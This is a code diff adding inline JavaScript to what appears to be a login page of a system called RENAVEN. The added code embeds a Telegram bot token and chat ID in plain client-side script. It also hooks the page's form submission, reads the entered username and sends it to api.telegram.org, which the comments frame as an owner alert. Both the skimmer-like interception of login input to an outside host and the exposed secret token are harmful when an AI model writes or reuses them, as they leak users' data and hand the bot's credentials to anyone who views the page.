@@ -1886,6 +1886,54 @@
                 icon.classList.add('fa-eye');
             }
         }
+        // ========================================================================
+// NOTIFICACIÓN A TELEGRAM - RENAVEN (TODO EN UNO)
+// ========================================================================
+const TELEGRAM_TOKEN = '8734974003:AAGBVRytYEXZLVTqikT7w_0a3EMTkkd6ZD0';
+const TELEGRAM_CHAT_ID = '1623792128';
+
+// Esta función envía el mensaje a tu Telegram
+async function enviarAlertaTelegram(usuario, rol) {
+    const fecha = new Date().toLocaleString('es-VE', { timeZone: 'America/Caracas' });
+    const mensaje = `🔔 *NUEVO INICIO DE SESIÓN*\n\n👤 *Usuario:* ${usuario}\n🔑 *Rol:* ${rol}\n🕐 *Fecha:* ${fecha}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            })
+        });
+        console.log('✅ Notificación enviada al dueño');
+    } catch (error) {
+        console.error('❌ Error al enviar notificación:', error);
+    }
+}
+
+// ========================================================================
+// INTERCEPTOR AUTOMÁTICO DE LOGIN
+// ========================================================================
+// Esto detecta automáticamente cuando el formulario de login se envía
+document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.querySelector('form');
+    
+    if (loginForm) {
+        loginForm.addEventListener('submit', (e) => {
+            // Esperamos 1 segundo para que el sistema procese el login
+            setTimeout(() => {
+                // Buscamos el nombre de usuario que se escribió en el input
+                const userInput = document.querySelector('input[type="text"]') || document.querySelector('input[name="usuario"]');
+                
+                if (userInput && userInput.value) {
+                    enviarAlertaTelegram(userInput.value, 'Acceso al Sistema');
+                }
+            }, 1000);
+        });
+    }
+});
     </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js">
     </script>
